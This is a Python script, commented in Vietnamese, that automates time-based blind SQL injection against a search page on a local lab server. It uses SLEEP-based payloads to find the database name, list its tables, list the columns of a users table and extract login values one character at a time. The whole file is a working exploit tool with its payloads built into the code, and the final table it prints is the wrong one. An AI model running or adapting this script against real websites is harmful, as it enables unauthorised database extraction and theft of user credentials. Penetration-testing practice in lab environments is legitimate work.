from tabnanny import check
import requests
from requests.models import Response
from prettytable import PrettyTable

#Hàm kiểm tra xem mục tiêu có lỗi sql hay không
def check_blind_sqli(burp0_url):
    print("=============================================")
    payload = "Great Gastby' or 1=1 AND SLEEP(5)#"
    params = {'title':payload, 'action':'search'}
    result = requests.get(burp0_url, params= params)
    if int(result.elapsed.total_seconds()) > 5:
        print("Trang web có lỗi blind-based SQL injection")
        return True
    else:
        print("Trang web KHÔNG có lỗi blind based SQL injection")
        return False

#Hàm xác định độ dài của tên csdl
def database_length(burp0_url):
    print("=============================================")
    print("Kiểm tra độ dài CSDL: ")
    count=0
    for i in range (0,10):
        payload = "Great Gastby' or if(length(database())="+str(i)+",SLEEP(5),null)#"
        params = {'title':payload, 'action':'search'}
        result = requests.get(burp0_url, params= params)
        if int(result.elapsed.total_seconds()) > 5:
            print("Độ dài cơ sở dữ liệu là: ",i)
            break
        else:
            count = i
            print('==>',count)
    return count+1

#Hàm tìm tên CSDL
def find_databasename(pass_length, burp0_url):
    print("=============================================")
    print("Tên CSDL: ")
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    name = ""
    for j in range(1,pass_length+1):
        for i in alphabet:
            payload = "' or if(substring(database(),"+str(j)+",1)='"+str(i)+"',SLEEP(5),null)#"
            params = {'title':payload, 'action':'search'}
            result = requests.get(burp0_url, params= params)
            if int(result.elapsed.total_seconds()) > 5:
                name += i
                print("Find:"+name)
                break
    return name

#Hàm tìm tên bảng thuộc CSDL trên
def find_tablename(database_name, burp0_url):
    print("=============================================")
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    tables_name = []
    name = ''
    for k in range(0,10):
        for j in range(1,20):
            for i in alphabet:
                payload = "Great Gatsby' or if(substring((select table_name from information_schema.tables where table_schema='"+database_name+"' limit "+str(k)+",1),"+str(j)+",1)='"+str(i)+"',SLEEP(5),null)#"
                params = {'title':payload, 'action':'search'}
                result = requests.get(burp0_url, params= params)
                if int(result.elapsed.total_seconds()) > 5:
                    name += i
                    print("Table "+str(k)+": "+name)
                    break
        print(".............................................")
        tables_name.append(name)
        name = ''
    tables_name = list(filter(None, tables_name))
    return tables_name

#Hàm tìm các cột trong bảng users
def column_table(burp0_url):
    print("=============================================")
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    column_name = []
    name = ''
    for k in range(0,10):
        for j in range(1,20):
            for i in alphabet:
                payload = "Great Gatsby' or if(substring((select column_name from information_schema.columns where table_schema='sqli' and table_name='users' limit "+str(k)+",1),"+str(j)+",1)='"+str(i)+"',SLEEP(5),null)#"
                params = {'title':payload, 'action':'search'}
                result = requests.get(burp0_url, params= params)
                if int(result.elapsed.total_seconds()) > 5:
                    name += i
                    print("Column "+str(k)+": " +name)
                    break
        print(".............................................")
        column_name.append(name)
        name = ''
    column_name = list(filter(None, column_name))
    return column_name

def dump_users(burp0_url):
    print("=============================================")
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    value = []
    name = ''
    for k in range(0,10):
        for j in range(1,20):
            for i in alphabet:
                payload = "Great Gatsby' or if(substring((select login from users limit "+str(k)+",1),"+str(j)+",1)='"+str(i)+"',SLEEP(5),null)#"
                params = {'title':payload, 'action':'search'}
                result = requests.get(burp0_url, params= params)
                if int(result.elapsed.total_seconds()) > 5:
                    name += i
                    print("Value "+str(k)+": " +name)
                    break
        print(".............................................")
        value.append(name)
        name = ''
    value = list(filter(None, value))
    return value

burp0_url = "http://localhost:8082/SQLI/Time_based.php"
check = check_blind_sqli(burp0_url)
if(check==True):
    pass_length=database_length(burp0_url)
    database_name=find_databasename(pass_length, burp0_url)
    table_name=find_tablename(database_name, burp0_url)
    t = PrettyTable(['STT', 'Table name'])
    for i in range (0,len(table_name)):
        t.add_row([str(i), table_name[i]])
    print(t)

    column_users = column_table(burp0_url)
    t1 = PrettyTable(['STT', 'Column name'])
    for i in range (0,len(column_users)):
        t1.add_row([str(i), column_users[i]])
    print(t1)

    dump_user = dump_users(burp0_url)
    t2 = PrettyTable(['STT', 'Value'])
    for i in range (0,len(dump_user)):
        t2.add_row([str(i), dump_user[i]])
    print(t1)
else:
    print("Không khai thác được, trầm cảm rồi")
